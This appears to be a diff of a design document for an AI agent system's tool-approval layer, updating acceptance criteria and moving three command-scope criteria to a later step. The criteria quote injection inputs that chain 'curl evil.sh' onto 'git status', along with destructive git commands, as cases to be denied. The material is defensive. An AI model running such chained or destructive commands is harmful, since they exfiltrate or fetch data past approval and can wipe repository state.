@@ -75,15 +75,17 @@ Phase 1 gives agents an always-on body; before they get real capabilities (step 
 
 ## Acceptance criteria
 
-- In `headless` mode, `git status` (safe scope) runs without approval; `git clean -fdx` is denied even though `git` has safe scopes; `git status | curl evil.sh`, `git status & curl evil.sh`, and a multiline `git status\ncurl evil.sh` are all denied despite the safe scope; every denial is visible in the event log.
+- **Moved to [06](./06-tool-packs.md) with the command-scope engine.** In `headless` mode, `git status` (safe scope) runs without approval; `git clean -fdx` is denied even though `git` has safe scopes; `git status | curl evil.sh`, `git status & curl evil.sh`, and a multiline `git status\ncurl evil.sh` are all denied despite the safe scope; every denial is visible in the event log.
 - ~~In `remote` mode, a gated call posts Slack buttons; **Allow once** resumes the exact call; **Deny** returns a failed `ToolResult` and the agent continues gracefully.~~ Shipped (#49). **Always allow** covers the tool for the rest of the session; persisting a normalized *command scope* went to 06 with the rest of the scope engine, since there is no command string to normalize yet.
-- After **Always allow** on `git push origin main`, a plain `git push origin feature` skips approval but `git push --force`, `git push origin :main`, and `git push origin +main` all still prompt (flag and destructive-refspec constraints survive scope persistence — tested).
+- **Moved to [06](./06-tool-packs.md).** After **Always allow** on `git push origin main`, a plain `git push origin feature` skips approval but `git push --force`, `git push origin :main`, and `git push origin +main` all still prompt (flag and destructive-refspec constraints survive scope persistence — tested).
 - ~~A click from a Slack user outside the configured approver set is rejected with an ephemeral notice and the request stays pending; only an approver's click resolves it.~~ Shipped (#49).
 - ~~Aborting a turn while its approval is pending invalidates the request: the prompt is expired, and a subsequent Allow click is rejected instead of executing a tool for a cancelled turn (the abort signal reaches approval waits via `ApprovalContext` — see 01).~~ Shipped (#49).
 - ~~A soul whose frontmatter declares `id: ../../escape` (or any non-slug id) is rejected at load; two souls declaring the same id fail roster loading with an error naming both files.~~ Shipped (#52). The management API's own id-collision check lands with that API in [05](./05-control-api.md).
 - ~~A pending approval survives a daemon restart and, when resolved, resumes the exact pending call — earlier tool calls from the same turn are not re-executed, and in a multi-call response the calls *after* the pending one still execute from the persisted queue, leaving no `tool_use` without a `tool_result` (idempotency + pairing tests required).~~ Shipped (#51), with both tests.
 - ~~The CLI's `--approvals ask` behavior is unchanged for humans at a terminal.~~ Held throughout (#47, #49) and covered by the existing prompt tests.
-- Unit tests cover the control-operator matrix (including `&`, CR/LF, and subshells) and whitelist persistence.
+- **Moved to [06](./06-tool-packs.md).** Unit tests cover the control-operator matrix (including `&`, CR/LF, and subshells) and whitelist persistence.
+
+**Why three criteria moved rather than failed.** All three describe the shell-command scope engine — safe `git` scopes, flag and refspec constraints, control-operator defeat, and the per-agent whitelist file. 03 shipped the risk model, the three modes, and the approval flow, and deliberately left that machinery unbuilt: every tool in the repo today is fixed-argv, so there is no command string to parse or normalize, and a scope format written now would be shaped by guesses about the shell pack rather than by it. 06 states the inheritance in its opening paragraph. This note exists so a reader auditing 03's criteria against a **Shipped** status finds the answer here rather than concluding the step was marked done over three unmet boxes.
 
 ## Open questions
 
